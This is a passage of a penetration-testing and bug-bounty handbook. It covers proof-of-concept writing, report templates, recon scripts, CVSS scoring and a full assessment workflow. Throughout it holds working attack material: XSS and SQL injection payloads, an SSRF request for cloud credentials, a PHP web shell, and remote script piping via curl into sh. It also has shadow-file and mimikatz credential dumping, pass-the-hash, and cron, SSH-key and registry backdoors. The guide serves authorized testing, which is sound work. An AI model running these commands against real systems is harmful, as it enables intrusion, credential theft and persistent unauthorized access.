  -d "code=PROMO100"
```

### Exploitation and Validation

**Proof of Concept (PoC) creation:**

```bash
# Minimal working example
# Bad:
"I found XSS by injecting <script> tags"

# Good:
"XSS in search parameter:
URL: https://target.com/search?q=<payload>
Payload: "><svg/onload=alert(document.domain)>
Steps:
1. Navigate to https://target.com/search
2. Enter: "><svg/onload=alert(document.domain)>
3. Submit search
4. XSS triggers showing document.domain in alert
Screenshot: [attached]"
```

**Impact demonstration:**

```bash
# For SSRF - show internal network access
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# For SQLi - show data extraction
sqlmap -u "URL" --dump -D database -T users --columns

# For file upload - show RCE
# Upload shell.php
# Access: https://target.com/uploads/shell.php?cmd=id

# For IDOR - show unauthorized access
# User A account ID: 123
# Access User B data with ID: 124
curl "https://target.com/api/user/124" -H "Auth: USER_A_TOKEN"
```

**Video recording tools:**

```bash
# Using asciinema for terminal recording
asciinema rec exploit_demo.cast

# Using OBS for screen recording
# Record full exploit demonstration

# Using peek for GIF recording
peek
```

### Report Writing Best Practices

**Report structure template:**

```markdown
# Summary
[One-line description of vulnerability]

# Severity
[Critical/High/Medium/Low with justification]

# Vulnerability Details
## Description
[Detailed explanation of the vulnerability]

## Affected Asset
- URL: https://target.com/vulnerable-endpoint
- Parameter: [parameter name]
- Method: POST/GET
- Authentication: Required/Not required

## Steps to Reproduce
1. [Detailed step 1]
2. [Detailed step 2]
3. [Observe behavior]

## Proof of Concept
```

[Code/curl command/video link]

```

## Impact
[What an attacker can achieve]
- Data theft
- Account takeover
- RCE
- [etc.]

# Remediation
[Specific fixes to implement]

# References
- [CVE/CWE links]
- [Related research]
```

**Good report characteristics:**

```
✓ Clear and concise
✓ Easy to reproduce
✓ Includes PoC
✓ Demonstrates impact
✓ Provides remediation advice
✓ Professional tone
✓ Screenshots/videos
✓ Technical accuracy

✗ Vague descriptions
✗ No reproduction steps
✗ Exaggerated impact
✗ Unprofessional language
✗ Duplicate submissions
✗ Out of scope findings
```

### Bug Bounty Platform Workflows

**HackerOne submission:**

```bash
# Report format:
# 1. Submit via platform interface
# 2. Include all technical details
# 3. Set severity (they may adjust)
# 4. Wait for triage
# 5. Respond to questions promptly
# 6. Provide additional info if requested

# Common triage responses:
# - Need more info
# - Cannot reproduce
# - Duplicate
# - Informative (won't fix)
# - Triaged (validated)
```

**Bugcrowd submission:**

```bash
# Similar process to HackerOne
# Key differences:
# - Vulnerability Rating Taxonomy (VRT) used
# - P1/P2/P3/P4 priority system
# - Different payout structure
```

**Synack Red Team operations:**

```bash
# Platform-specific:
# - Use Synack-provided VPN
# - Follow strict target rules
# - Submit via SRT platform
# - Automated vulnerability validation

# [Unverified] Additional platform-specific requirements may exist
```

### Automation and Tooling

**Complete reconnaissance automation:**

```bash
#!/bin/bash
# recon.sh

DOMAIN=$1

echo "[+] Starting reconnaissance on $DOMAIN"

# Subdomain enumeration
echo "[*] Enumerating subdomains..."
subfinder -d $DOMAIN -o subs_subfinder.txt -silent
amass enum -passive -d $DOMAIN -o subs_amass.txt
cat subs_*.txt | sort -u > all_subs.txt

# Check live hosts
echo "[*] Checking live hosts..."
cat all_subs.txt | httpx -silent -o live_hosts.txt

# Port scanning
echo "[*] Port scanning..."
nmap -iL live_hosts.txt -T4 -Pn --top-ports 1000 -oA nmap_scan

# Content discovery
echo "[*] Content discovery..."
cat live_hosts.txt | while read host; do
  ffuf -w /usr/share/wordlists/dirb/common.txt \
    -u $host/FUZZ -mc 200,301,302,401,403 -o ffuf_$host.json -s
done

# JavaScript files
echo "[*] Finding JavaScript files..."
gospider -S live_hosts.txt -c 10 -d 3 --js -o gospider_output

# Technology detection
echo "[*] Technology detection..."
cat live_hosts.txt | while read host; do
  whatweb -a 3 $host >> whatweb_results.txt
done

echo "[+] Reconnaissance complete. Check output files."
```

**Nuclei scanning workflow:**

```bash
# Install nuclei
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest

# Update templates
nuclei -update-templates

# Scan with all templates
nuclei -l targets.txt -t nuclei-templates/ -o nuclei_results.txt

# Scan specific severity
nuclei -l targets.txt -s critical,high -o critical_vulns.txt

# Custom templates for specific program
nuclei -l targets.txt -t custom-templates/ -o custom_results.txt

# Rate limiting
nuclei -l targets.txt -rl 150  # 150 requests per second
```

**Custom vulnerability scanner:**

```python
#!/usr/bin/env python3
import requests
import sys
from concurrent.futures import ThreadPoolExecutor

payloads = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "admin' OR '1'='1",
    "' UNION SELECT NULL--",
]

def test_sqli(url, param):
    """Test SQL injection on specific parameter"""
    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        try:
            response = requests.get(test_url, timeout=5)
            # Look for SQL error messages
            if any(error in response.text.lower() for error in 
                   ['sql', 'mysql', 'sqlite', 'postgresql', 'oracle']):
                print(f"[+] Potential SQLi: {test_url}")
                return True
        except:
            pass
    return False

def scan_url(url):
    """Scan single URL for common vulnerabilities"""
    print(f"[*] Scanning: {url}")
    
    # Test for SQL injection
    common_params = ['id', 'page', 'user', 'cat', 'search', 'query']
    for param in common_params:
        test_sqli(url, param)

def main():
    with open(sys.argv[1]) as f:
        urls = [line.strip() for line in f]
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(scan_url, urls)

if __name__ == "__main__":
    main()
```

**Monitoring for new assets:**

```bash
#!/bin/bash
# asset_monitor.sh

DOMAIN=$1
OLD_SUBS="old_subdomains.txt"
NEW_SUBS="new_subdomains.txt"

# Get current subdomains
subfinder -d $DOMAIN -o $NEW_SUBS -silent

# Compare with old list
if [ -f $OLD_SUBS ]; then
  diff $OLD_SUBS $NEW_SUBS | grep ">" | cut -d " " -f 2 > new_assets.txt
  
  if [ -s new_assets.txt ]; then
    echo "[+] New assets found:"
    cat new_assets.txt
    
    # Notify via webhook
    cat new_assets.txt | while read asset; do
      curl -X POST https://webhook.site/your-id \
        -d "New asset discovered: $asset"
    done
  fi
fi

# Update old list
cp $NEW_SUBS $OLD_SUBS
```

---

## CVSS Scoring

### CVSS v3.1 Base Metrics

**Attack Vector (AV):**

```
Network (N) - 0.85
  - Exploitable remotely over network
  - Example: SQL injection on public website

Adjacent (A) - 0.62
  - Requires local network access
  - Example: ARP spoofing on local LAN

Local (L) - 0.55
  - Requires local access to system
  - Example: Privilege escalation from local user

Physical (P) - 0.20
  - Requires physical access
  - Example: Cold boot attack on laptop
```

**Attack Complexity (AC):**

```
Low (L) - 0.77
  - No special conditions required
  - Easily repeatable
  - Example: Unauthenticated SQLi with no filters

High (H) - 0.44
  - Requires specific conditions
  - Depends on race conditions, timing
  - Example: TOCTOU vulnerability requiring precise timing
```

**Privileges Required (PR):**

```
None (N) - 0.85
  - No authentication required
  - Example: Unauthenticated RCE

Low (L) - 0.62 (changed scope) / 0.68 (unchanged scope)
  - Basic user privileges required
  - Example: Authenticated IDOR

High (H) - 0.27 (changed scope) / 0.50 (unchanged scope)
  - Administrative privileges required
  - Example: Admin panel XSS
```

**User Interaction (UI):**

```
None (N) - 0.85
  - No user interaction required
  - Example: Blind SQLi that executes automatically

Required (R) - 0.62
  - Requires victim action
  - Example: Stored XSS requiring victim to visit page
```

**Scope (S):**

```
Unchanged (U)
  - Impact limited to vulnerable component
  - Example: XSS affecting only the vulnerable application

Changed (C)
  - Impact extends beyond vulnerable component
  - Example: SSRF allowing access to internal network
```

**Confidentiality Impact (C):**

```
None (N) - 0.0
  - No information disclosure

Low (L) - 0.22
  - Some information disclosed
  - Limited scope or sensitivity
  - Example: Information disclosure of non-sensitive data

High (H) - 0.56
  - Total information disclosure
  - Example: SQL injection dumping entire database
```

**Integrity Impact (I):**

```
None (N) - 0.0
  - No data modification possible

Low (L) - 0.22
  - Limited data modification
  - Example: Ability to modify own profile data

High (H) - 0.56
  - Complete data modification
  - Example: SQL injection allowing UPDATE/DELETE on any table
```

**Availability Impact (A):**

```
None (N) - 0.0
  - No availability impact

Low (L) - 0.22
  - Reduced performance or minor disruption
  - Example: Mild resource exhaustion

High (H) - 0.56
  - Complete service disruption
  - Example: Remote DoS causing system crash
```

### CVSS Score Calculation

**Formula:**

```
Base Score = Roundup(Minimum[(Impact + Exploitability), 10])

Exploitability = 8.22 × AV × AC × PR × UI

Impact (Scope Unchanged) = 6.42 × ISS
Impact (Scope Changed) = 7.52 × (ISS - 0.029) - 3.25 × (ISS - 0.02)^15

ISS = 1 - [(1 - C) × (1 - I) × (1 - A)]
```

**Online CVSS calculators:**

```
NIST Calculator: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator
FIRST Calculator: https://www.first.org/cvss/calculator/3.1
```

### Severity Rating Scale

**CVSS Score to Severity:**

```
None:     0.0
Low:      0.1 - 3.9
Medium:   4.0 - 6.9
High:     7.0 - 8.9
Critical: 9.0 - 10.0
```

### Real-World CVSS Examples

**Example 1: Unauthenticated SQL Injection**

```
Attack Vector (AV): Network (N)
Attack Complexity (AC): Low (L)
Privileges Required (PR): None (N)
User Interaction (UI): None (N)
Scope (S): Unchanged (U)
Confidentiality (C): High (H)
Integrity (I): High (H)
Availability (A): High (H)

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
CVSS Score: 9.8 (Critical)

Justification:
- Remotely exploitable without authentication
- Can read entire database (C:High)
- Can modify/delete data (I:High)
- Can drop tables causing DoS (A:High)
```

**Example 2: Authenticated IDOR**

```
Attack Vector (AV): Network (N)
Attack Complexity (AC): Low (L)
Privileges Required (PR): Low (L)
User Interaction (UI): None (N)
Scope (S): Unchanged (U)
Confidentiality (C): High (H)
Integrity (I): None (N)
Availability (A): None (N)

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
CVSS Score: 6.5 (Medium)

Justification:
- Requires authenticated user account
- Can access other users' data (C:High)
- Cannot modify data (I:None)
- No DoS capability (A:None)
```

**Example 3: Stored XSS (Admin Context)**

```
Attack Vector (AV): Network (N)
Attack Complexity (AC): Low (L)
Privileges Required (PR): Low (L)
User Interaction (UI): Required (R)
Scope (S): Changed (C)
Confidentiality (C): Low (L)
Integrity (I): Low (L)
Availability (A): None (N)

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
CVSS Score: 5.4 (Medium)

Justification:
- Requires low-privilege user to inject
- Requires admin to trigger (UI:Required)
- Scope changed because affects admin context
- Limited data access (C:Low)
- Can perform limited actions as admin (I:Low)
```

**Example 4: SSRF to Internal Network**

```
Attack Vector (AV): Network (N)
Attack Complexity (AC): Low (L)
Privileges Required (PR): None (N)
User Interaction (UI): None (N)
Scope (S): Changed (C)
Confidentiality (C): High (H)
Integrity (I): None (N)
Availability (A): None (N)

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
CVSS Score: 8.6 (High)

Justification:
- No authentication required
- Scope changed (accesses internal network)
- Can read data from internal services (C:High)
- Cannot modify internal data (I:None)
```

**Example 5: Reflected XSS**

```
Attack Vector (AV): Network (N)
Attack Complexity (AC): Low (L)
Privileges Required (PR): None (N)
User Interaction (UI): Required (R)
Scope (S): Changed (C)
Confidentiality (C): Low (L)
Integrity (I): Low (L)
Availability (A): None (N)

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
CVSS Score: 6.1 (Medium)

Justification:
- Requires victim to click malicious link
- Scope changed (can interact with other origins)
- Can steal session cookies (C:Low)
- Can perform limited actions as user (I:Low)
```

### Temporal Metrics

[Inference] Temporal metrics modify base score based on exploit availability and remediation status:

**Exploit Code Maturity (E):**

```
Not Defined (X) - 1.0
Unproven (U) - 0.91 - No known exploit
Proof-of-Concept (P) - 0.94 - PoC code exists
Functional (F) - 0.97 - Working exploit exists
High (H) - 1.0 - Automated exploit available
```

**Remediation Level (RL):**

```
Not Defined (X) - 1.0
Official Fix (O) - 0.95 - Vendor patch available
Temporary Fix (T) - 0.96 - Workaround exists
Workaround (W) - 0.97 - Unofficial patch
Unavailable (U) - 1.0 - No fix available
```

**Report Confidence (RC):**

```
Not Defined (X) - 1.0
Unknown (U) - 0.92 - Unconfirmed report
Reasonable (R) - 0.96 - Likely but unconfirmed
Confirmed (C) - 1.0 - Verified by vendor/researcher
```

### Environmental Metrics

[Inference] Environmental metrics adjust score based on organizational context:

**Modified Base Metrics:**

```
Organizations can adjust C/I/A based on:
- Importance of affected system
- Data sensitivity
- Business criticality

Example:
Base: C:H/I:H/A:H
Modified: C:H/I:H/A:L (if availability not critical)
```

**Security Requirements:**

```
Confidentiality Requirement (CR): Low/Medium/High
Integrity Requirement (IR): Low/Medium/High
Availability Requirement (AR): Low/Medium/High

Multipliers:
Low (L) - 0.5
Medium (M) - 1.0
High (H) - 1.5
```

---

## Vulnerability Assessment Workflow

### Pre-Assessment Phase

**Define scope:**

```markdown
# Scope Definition Template

## In-Scope Assets
- Domain: *.target.com
- IP Ranges: 192.168.1.0/24, 10.0.0.0/16
- Applications: Web app, Mobile app (Android/iOS)
- APIs: api.target.com, api-v2.target.com

## Out-of-Scope
- Third-party services (CDN, analytics)
- Physical security testing
- Social engineering
- DoS attacks
- *.outofscope.target.com

## Testing Window
- Start: 2025-01-15 09:00 UTC
- End: 2025-01-30 18:00 UTC
- Maintenance windows: Daily 02:00-04:00 UTC (no testing)

## Authorized Actions
✓ Automated vulnerability scanning
✓ Manual exploitation of findings
✓ Credentials: test_user:test_pass
✗ Data modification beyond test accounts
✗ Exploitation of production databases

## Contact Information
- Technical contact: security@target.com
- Emergency contact: +1-555-0123 (24/7)
```

**Gather intelligence:**

```bash
# Company information
whois target.com
whois -h whois.arin.net "n + target-company"

# DNS records
dig target.com ANY
dig target.com MX
dig target.com TXT

# SSL/TLS certificates
```

```bash
# SSL/TLS certificates (continued)
openssl s_client -connect target.com:443 -showcerts

# Certificate Transparency logs
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
  jq -r '.[].name_value' | sort -u

# ASN information
whois -h whois.cymru.com " -v AS15169"

# Historical DNS data
# Check: securitytrails.com, dnsdumpster.com
```

**Create testing methodology:**

```markdown
# Assessment Methodology

## Phase 1: Information Gathering (Days 1-2)
- Passive reconnaissance
- Active enumeration
- Asset inventory

## Phase 2: Vulnerability Identification (Days 3-7)
- Automated scanning
- Manual testing
- Configuration review

## Phase 3: Exploitation (Days 8-12)
- Proof of concept development
- Impact validation
- Privilege escalation attempts

## Phase 4: Post-Exploitation (Days 13-14)
- Lateral movement testing
- Data access validation
- Persistence mechanisms

## Phase 5: Reporting (Days 15-16)
- Documentation
- Risk assessment
- Remediation recommendations
```

### Asset Discovery Phase

**Network mapping:**

```bash
# Full network discovery
nmap -sn 192.168.1.0/24 -oA network_discovery

# OS fingerprinting
nmap -O -sV 192.168.1.0/24 -oA os_fingerprint

# Service enumeration with scripts
nmap -sC -sV -p- -T4 192.168.1.0/24 -oA full_scan

# UDP scan (slower but important)
nmap -sU --top-ports 100 192.168.1.0/24 -oA udp_scan

# IPv6 scanning if applicable
nmap -6 -sT -sV ipv6-target -oA ipv6_scan
```

**Web application inventory:**

```bash
# Screenshot all web services
aquatone -ports xlarge < live_hosts.txt

# or using eyewitness
python3 EyeWitness.py -f live_hosts.txt --web

# Technology stack identification
cat live_hosts.txt | while read host; do
  echo "=== $host ===" >> tech_stack.txt
  whatweb -a 3 $host >> tech_stack.txt
  wappalyzer $host >> tech_stack.txt
done

# Certificate analysis
cat live_hosts.txt | while read host; do
  echo | openssl s_client -servername $host -connect $host:443 2>/dev/null | \
    openssl x509 -noout -text >> ssl_analysis.txt
done
```

**Cloud asset discovery:**

```bash
# AWS S3 bucket enumeration
# Check common patterns
aws s3 ls s3://target-company
aws s3 ls s3://target-com
aws s3 ls s3://target-backup
aws s3 ls s3://target-prod

# Using bucket_finder
python bucket_finder.py wordlist.txt

# Azure blob storage
# Check: https://target.blob.core.windows.net/

# GCP storage
# Check: https://storage.googleapis.com/target-bucket/

# Using cloud_enum
python3 cloud_enum.py -k target-company
```

**API discovery:**

```bash
# Common API paths
ffuf -w api_paths.txt -u https://target.com/FUZZ

# API wordlist:
/api/v1
/api/v2
/rest
/graphql
/swagger.json
/openapi.json
/api-docs
/docs

# Swagger/OpenAPI enumeration
curl https://target.com/swagger.json | jq
curl https://target.com/v2/api-docs | jq

# GraphQL introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{__schema{types{name,fields{name}}}}"}'
```

**Database and service discovery:**

```bash
# Database ports
nmap -p 3306,5432,1433,27017,6379,9200,5984 target.com

# Redis enumeration
redis-cli -h target.com
INFO
KEYS *

# MongoDB enumeration
mongo --host target.com
show dbs
use target_db
show collections

# Elasticsearch enumeration
curl http://target.com:9200/
curl http://target.com:9200/_cat/indices?v
curl http://target.com:9200/index_name/_search?pretty

# CouchDB enumeration
curl http://target.com:5984/
curl http://target.com:5984/_all_dbs
```

### Vulnerability Scanning Phase

**Automated web vulnerability scanning:**

```bash
# Nikto scan
nikto -h https://target.com -output nikto_results.txt

# Burp Suite automated scan
# 1. Configure target scope
# 2. Spider target
# 3. Run active scanner
# 4. Export results

# OWASP ZAP
zap-cli quick-scan -s all -r https://target.com

# Nuclei with all templates
nuclei -l targets.txt -t ~/nuclei-templates/ \
  -severity critical,high,medium \
  -o nuclei_all.txt

# W3af
w3af_console
target set target https://target.com
plugins
audit all
crawl web_spider
start
```

**SSL/TLS assessment:**

```bash
# Using testssl.sh
./testssl.sh --full https://target.com

# Check for specific vulnerabilities
./testssl.sh --heartbleed --ccs-injection --ticketbleed https://target.com

# Using sslscan
sslscan target.com

# Using sslyze
sslyze --regular target.com

# Check for expired certificates
echo | openssl s_client -connect target.com:443 2>/dev/null | \
  openssl x509 -noout -dates
```

**CMS-specific scanning:**

```bash
# WordPress
wpscan --url https://target.com --enumerate u,ap,at,cb,dbe
wpscan --url https://target.com --detection-mode aggressive

# Drupal
droopescan scan drupal -u https://target.com

# Joomla
joomscan -u https://target.com

# Generic CMS detection then targeted scan
cmseek -u https://target.com
```

**Network vulnerability scanning:**

```bash
# OpenVAS/GVM setup and scan
gvm-cli socket --xml "<create_target><name>Target</name><hosts>192.168.1.0/24</hosts></create_target>"

# Nessus (commercial)
# Configure via web interface: https://localhost:8834

# Using nmap NSE scripts for vulns
nmap --script vuln target.com -oA nmap_vulns

# Specific vulnerability checks
nmap --script ssl-heartbleed target.com
nmap --script smb-vuln-ms17-010 target.com
nmap --script http-shellshock target.com
```

**Infrastructure vulnerability assessment:**

```bash
# Container security
# Docker
docker scan image_name

# Kubernetes
kube-hunter --remote target.com

# Cloud security
# AWS
prowler -M html

# Azure
az security assessment list

# Using ScoutSuite (multi-cloud)
scout aws --profile target-profile
```

### Manual Testing Phase

**Authentication testing checklist:**

```markdown
## Password Policy
- [ ] Minimum length requirements
- [ ] Complexity requirements enforced
- [ ] Password history checked
- [ ] Account lockout after failed attempts
- [ ] Lockout duration reasonable
- [ ] Rate limiting on login endpoint

## Session Management
- [ ] Session tokens random and unpredictable
- [ ] Session timeout configured
- [ ] Secure flag on cookies
- [ ] HTTPOnly flag on session cookies
- [ ] Session invalidated on logout
- [ ] Concurrent session handling
- [ ] Session fixation protection

## Multi-Factor Authentication
- [ ] MFA available
- [ ] MFA bypass attempts fail
- [ ] Backup codes properly secured
- [ ] Rate limiting on MFA codes

## Password Reset
- [ ] Token unpredictable
- [ ] Token expires after use
- [ ] Token expires after time limit
- [ ] Old password not required knowledge
- [ ] No username enumeration
- [ ] Rate limiting on reset requests

## OAuth/SSO
- [ ] State parameter validated
- [ ] Redirect URI validated
- [ ] Token not leaked in logs/referer
```

**Authorization testing:**

```bash
# Create test users with different privilege levels
# User roles: admin, user, guest

# Test horizontal privilege escalation
# User A: GET /api/user/123/profile (own profile)
# User A: GET /api/user/456/profile (User B's profile - should fail)

# Test vertical privilege escalation
# Regular user: GET /admin/users (should fail)
# Regular user: POST /api/admin/create-user (should fail)

# Test for function-level access control
# Try accessing admin functions with regular user token
curl https://target.com/admin/delete-user -H "Auth: user_token"

# Test parameter tampering
# Change user_id in hidden form fields
# Change role=user to role=admin in requests
```

**Business logic testing:**

```bash
# Test numeric overflow
# Order -1 items to get credit
curl -X POST https://target.com/order \
  -d "item_id=123&quantity=-1"

# Test price manipulation
# Change price parameter in order request
curl -X POST https://target.com/checkout \
  -d "item_id=123&price=0.01"

# Test workflow bypass
# Skip steps in multi-step process
# Order confirmation without payment

# Test race conditions
# Parallel requests example (redeem coupon twice)
for i in {1..10}; do
  curl -X POST https://target.com/redeem \
    -H "Cookie: session=..." \
    -d "coupon=FREESTUFF" &
done
wait

# Test negative values
# Withdraw -100 (deposit 100)
curl -X POST https://target.com/transfer \
  -d "amount=-100&to_account=attacker"
```

**Input validation testing:**

```bash
# Test maximum length
# Send 1000+ character input
python3 -c "print('A' * 10000)" | curl -X POST https://target.com/input -d @-

# Test special characters
# Test: ' " < > ; | & $ ( ) ` \ 

# Test null bytes
curl "https://target.com/file?name=../../etc/passwd%00.jpg"

# Test unicode characters
curl "https://target.com/search?q=test%c0%80"

# Test format strings
curl "https://target.com/log?msg=%x%x%x%x"

# Test XML injection
curl -X POST https://target.com/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><test>&lt;script&gt;alert(1)&lt;/script&gt;</test>'
```

**File upload testing:**

```bash
# Test file extension filters
# Create test files
cp payload.php payload.jpg
cp payload.php payload.php.jpg
cp payload.php payload.php%00.jpg

# Test content-type bypass
curl -X POST https://target.com/upload \
  -F "file=@shell.php;type=image/jpeg"

# Test double extension
curl -X POST https://target.com/upload \
  -F "file=@shell.jpg.php"

# Test path traversal in filename
curl -X POST https://target.com/upload \
  -F "file=@payload.php;filename=../../../../var/www/html/shell.php"

# Test zip slip
# Create zip with path traversal entry
zip exploit.zip ../../../../tmp/shell.php

# Test for file inclusion after upload
curl "https://target.com/view?file=uploads/shell.php"
```

**API security testing:**

```bash
# Test for mass assignment
# Add unauthorized parameters
curl -X POST https://target.com/api/user/profile \
  -H "Content-Type: application/json" \
  -d '{"name":"User","email":"user@test.com","role":"admin"}'

# Test for excessive data exposure
curl https://target.com/api/users | jq

# Test rate limiting
for i in {1..1000}; do
  curl https://target.com/api/endpoint -H "Auth: token"
done

# Test API versioning
curl https://target.com/api/v1/users  # Old version might be vulnerable
curl https://target.com/api/v2/users

# Test GraphQL
# Query depth attack
curl -X POST https://target.com/graphql \
  -d '{"query":"query{user{posts{comments{author{posts{comments{author{posts{comments}}}}}}}}}}"}'

# Introspection
curl -X POST https://target.com/graphql \
  -d '{"query":"{__schema{queryType{fields{name,description}}}}"}'
```

### Exploitation Phase

**Exploit development workflow:**

```python
#!/usr/bin/env python3
# exploit_template.py

import requests
import sys

TARGET = "https://target.com"
VULNERABLE_ENDPOINT = "/api/vulnerable"

def check_vulnerability():
    """Check if target is vulnerable"""
    payload = "' OR '1'='1"
    response = requests.get(
        f"{TARGET}{VULNERABLE_ENDPOINT}",
        params={"id": payload}
    )
    
    if "SQL syntax" in response.text or "mysql" in response.text:
        print("[+] Target appears vulnerable")
        return True
    return False

def exploit():
    """Exploit the vulnerability"""
    # Extract data
    payload = "' UNION SELECT username,password FROM users--"
    response = requests.get(
        f"{TARGET}{VULNERABLE_ENDPOINT}",
        params={"id": payload}
    )
    
    print("[+] Extracted data:")
    print(response.text)

def main():
    print("[*] Testing target...")
    if check_vulnerability():
        print("[*] Exploiting...")
        exploit()
    else:
        print("[-] Target not vulnerable")

if __name__ == "__main__":
    main()
```

**Privilege escalation testing:**

```bash
# Linux privilege escalation enumeration
# Upload and run linpeas
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Manual checks
sudo -l  # Check sudo permissions
find / -perm -4000 -type f 2>/dev/null  # SUID binaries
cat /etc/crontab  # Cron jobs
ls -la /etc/cron.*
ps aux | grep root  # Root processes

# Windows privilege escalation
# Upload and run winPEAS
.\winPEASx64.exe

# Manual checks
whoami /priv  # Check privileges
whoami /groups
net user  # List users
net localgroup administrators  # List admins

# Check for unquoted service paths
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\"
```

**Lateral movement testing:**

```bash
# Network scanning from compromised host
./nmap -sn 10.0.0.0/24

# Check for shared credentials
grep -r "password" /home/ 2>/dev/null
cat ~/.bash_history | grep -i "pass\|ssh\|ftp"

# SSH key stealing
find / -name "id_rsa" -o -name "id_dsa" 2>/dev/null

# Pass-the-hash (if Windows)
pth-winexe -U domain/user%hash //target.com cmd

# Credential harvesting
# Linux
cat /etc/shadow
cat ~/.ssh/known_hosts

# Windows
mimikatz.exe "sekurlsa::logonpasswords" exit
```

**Persistence mechanism testing:**

```bash
# Test if backdoor can be established
# Web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# Upload to writable directory

# SSH key persistence (Linux)
mkdir -p ~/.ssh
echo "attacker_public_key" >> ~/.ssh/authorized_keys

# Scheduled task (Windows)
schtasks /create /tn "Update" /tr "C:\temp\backdoor.exe" /sc onlogon

# Cron job (Linux)
(crontab -l ; echo "@reboot /tmp/backdoor.sh") | crontab -

# Registry persistence (Windows)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\temp\backdoor.exe"
```

### Documentation Phase

**Evidence collection:**

```bash
# Screenshot tool
scrot -d 5 vulnerability_proof.png  # Linux

# Screen recording
asciinema rec exploitation.cast

# HTTP request/response capture
# Using Burp Suite: Proxy -> HTTP History -> Save item

# Network traffic capture
tcpdump -i eth0 -w capture.pcap "host target.com"

# Command history for report
script exploitation_session.log
# Run commands
exit

# Log aggregation
mkdir evidence/
cp screenshots/*.png evidence/
cp *.pcap evidence/
cp *.log evidence/
tar -czf evidence_$(date +%Y%m%d).tar.gz evidence/
```

**Vulnerability database template:**

````markdown
# Vulnerability: [Name]
ID: VULN-001
Date Found: 2025-10-18
Tester: [Name]

## Asset Details
- URL: https://target.com/vulnerable
- IP: 192.168.1.100
- Component: User Management Module
- Version: 2.3.1

## Vulnerability Details
### Type
SQL Injection

### CWE
CWE-89: Improper Neutralization of Special Elements used in an SQL Command

### CVSS v3.1 Score
9.8 (Critical)
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

### Description
The user_id parameter in the /api/user endpoint is vulnerable to SQL injection. An attacker can inject malicious SQL queries to extract, modify, or delete database contents.

### Affected Parameter
- Parameter: user_id
- Method: GET
- Endpoint: /api/user

### Proof of Concept
```bash
curl "https://target.com/api/user?user_id=1' UNION SELECT username,password FROM admin_users--"
````

Response shows admin credentials in plain text.

### Impact

- Complete database compromise
- Administrative account takeover
- Data exfiltration of all user records
- Potential for lateral movement to database server

### Remediation

1. Use parameterized queries/prepared statements
2. Implement input validation and sanitization
3. Apply least privilege to database accounts
4. Enable Web Application Firewall (WAF)

### References

- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html

### Evidence

- Screenshot: vuln001_screenshot.png
- Request/Response: vuln001_request.txt
- Video: vuln001_demo.mp4

```

### Risk Assessment and Prioritization

**Risk calculation matrix:**
```

Risk = Likelihood × Impact

Likelihood Scale: 1 - Very Low: Requires exceptional circumstances 2 - Low: Requires specific conditions 3 - Medium: Possible under normal conditions 4 - High: Likely to occur 5 - Very High: Almost certain to occur

Impact Scale: 1 - Minimal: No real impact 2 - Low: Minor impact, limited data exposure 3 - Medium: Moderate impact, significant data exposure 4 - High: Major impact, service disruption 5 - Critical: Severe impact, complete compromise

Risk Priority: 1-4: Low (Address in normal cycle) 5-9: Medium (Address within 3 months) 10-15: High (Address within 1 month) 16-25: Critical (Address immediately)

````

**Example risk assessment:**
```markdown
## Vulnerability: Unauthenticated SQL Injection

Likelihood: 5 (Very High)
- Remotely accessible
- No authentication required
- Simple to exploit
- Public exploit code available

Impact: 5 (Critical)
- Complete database access
- PII exposure (100,000+ users)
- Administrative access
- Regulatory compliance violation (GDPR)

Risk Score: 25 (Critical)
Priority: P0 - Immediate action required

## Vulnerability: Authenticated XSS in Admin Panel

Likelihood: 2 (Low)
- Requires admin account
- User interaction required
- Specific browser/conditions needed

Impact: 3 (Medium)
- Admin session hijacking possible
- Limited data exposure
- Does not affect all users

Risk Score: 6 (Low)
Priority: P3 - Address in next quarter
````

### Final Reporting Phase

**Executive summary template:**

```markdown
# Security Assessment Report
**Target:** Acme Corporation Web Application
**Assessment Period:** October 1-16, 2025
**Conducted By:** [Your Company/Name]

## Executive Summary

### Overview
A comprehensive security assessment was conducted on Acme Corporation's web application infrastructure. The assessment identified **15 vulnerabilities** across **8 tested assets**.

### Risk Summary
| Severity | Count | Percentage |
|----------|-------|------------|
| Critical | 2     | 13%        |
| High     | 4     | 27%        |
| Medium   | 6     | 40%        |
| Low      | 3     | 20%        |

### Key Findings
1. **Critical**: Unauthenticated SQL injection allows complete database compromise
2. **Critical**: Remote code execution via file upload vulnerability
3. **High**: Multiple instances of stored XSS in user input fields
4. **High**: Insecure direct object references expose sensitive user data

### Business Impact
- **Data Breach Risk**: High - 100,000+ user records at risk
- **Financial Impact**: Estimated $2M+ in potential breach costs
- **Compliance**: GDPR, PCI DSS violations identified
- **Reputation**: Public disclosure could damage brand reputation

### Recommendations Priority
1. **Immediate (1-7 days)**: Patch critical SQL injection and RCE vulnerabilities
2. **Short-term (1-30 days)**: Address high-severity findings
3. **Medium-term (1-3 months)**: Implement security controls for medium findings
4. **Long-term (3-12 months)**: Security awareness training, ongoing assessment program

## Methodology
- OWASP Testing Guide v4.2
- PTES (Penetration Testing Execution Standard)
